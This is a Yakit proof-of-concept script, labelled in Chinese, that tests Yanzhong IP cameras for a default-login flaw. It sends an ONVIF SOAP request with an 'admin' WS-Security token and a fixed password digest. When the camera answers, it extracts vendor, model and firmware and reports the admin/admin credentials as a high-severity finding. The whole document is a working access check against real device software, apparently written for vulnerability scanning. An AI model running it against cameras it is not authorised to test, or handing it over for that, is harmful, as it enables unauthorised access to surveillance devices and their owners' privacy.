script_name: 言中摄像头默认口令漏洞
content:
##server:言中摄像头
##type:poc
##params:root_url
##name:yanzhong_default_credential_poc
##severity:high
##out_put:yanzhong_username,yanzhong_password,yanzhong_vendor,yanzhong_product,yanzhong_firmware


yakit.AutoInitYakit()
log.setLevel("info")



poc=func(addr){
    isTls = str.IsTLSServer(addr)
    packet=`POST /onvif/device_service HTTP/1.1
Host: {{params(addr)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tds="http://www.onvif.org/ver10/device/wsdl" xmlns:tt="http://www.onvif.org/ver10/schema">
  <s:Header xmlns:s="http://www.w3.org/2003/05/soap-envelope">
    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
      <wsse:UsernameToken>
        <wsse:Username>admin</wsse:Username>
        <wsse:Password Type="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-username-token-profile-1.0#PasswordDigest">Qu0fGZ+j9CkqwMjWMw0ameFgtTc=</wsse:Password>
        <wsse:Nonce>mO+h+oLsv2NZXjIk9CjP7g==</wsse:Nonce>
        <wsu:Created>2020-11-09T01:54:20Z</wsu:Created>
      </wsse:UsernameToken>
    </wsse:Security>
  </s:Header>
  <soap:Body>
    <tds:GetDeviceInformation />
  </soap:Body>
</soap:Envelope>`

    rsp, req, err = poc.HTTP(packet, poc.https(isTls),poc.params({"addr":addr}),poc.redirectTimes(0),
    // poc.proxy("http://127.0.0.1:8083")
    )
    if err != nil {
        die(err)
    }
    vendor=[]
    product=[]
    firmware=[]
    if str.MatchAllOfSubString(rsp, [`HTTP/1.1 200`,`xml version=`]...){
        re_vendor_rule=`<tds:Manufacturer>(\w+-*\w*)</tds:Manufacturer>`
        re_product_rule=`<tds:Model>(\w+-*\w*)</tds:Model>`
        re_firmware_rule=`<tds:FirmwareVersion>(\w+.*\w+)</tds:FirmwareVersion>`
        if re.Match(re_vendor_rule, rsp){
            vendor=vendor+re.FindSubmatch(rsp, re_vendor_rule)[1]
        }
        if re.Match(re_product_rule, rsp){
            product=product+re.FindSubmatch(rsp, re_product_rule)[1]
        }
        if re.Match(re_firmware_rule, rsp){
            firmware=firmware+re.FindSubmatch(rsp, re_firmware_rule)[1]
        }
        risk.NewRisk(
            root_url, 
            risk.request(req),
            risk.response(rsp),
            risk.severity("high"), 
            risk.title(f"FOUND ${root_url} 存在言中默认口令漏洞"), 
            risk.titleVerbose("言中默认口令漏洞"), 
            risk.type("身份伪造"), 
            risk.typeVerbose("配置错误"),          
            risk.details({"yanzhong_username":"admin","yanzhong_password":"admin","yanzhong_vendor":vendor,"yanzhong_product":product,"yanzhong_firmware":firmware}))
    }
    
}



root_url = cli.String("root_url")
ip, port, err = str.ParseStringToHostPort(root_url)
if err != nil {
    die(err)
}

addr = str.HostPort(ip, port)
poc(addr)
